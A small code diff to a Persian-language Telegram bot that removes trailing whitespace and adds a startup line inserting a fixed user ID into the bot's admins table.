@@ -267,7 +267,7 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif query.data == "admin_stats":
         await query.message.reply_text("📊 آمار")
 
-        
+
 async def send_join_gate(update, context):
 
     channels = await get_active_channels()
@@ -470,4 +470,6 @@ app.add_handler(MessageHandler(filters.PHOTO | filters.VIDEO, save_media))
 app.add_handler(CommandHandler("addchannel", add_channel))
 app.add_handler(CommandHandler("listchannels", list_channels))
 app.add_handler(CommandHandler("removechannel", remove_channel))
+cursor.execute("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", ( 6503127920,))
+conn.commit()
 app.run_polling()
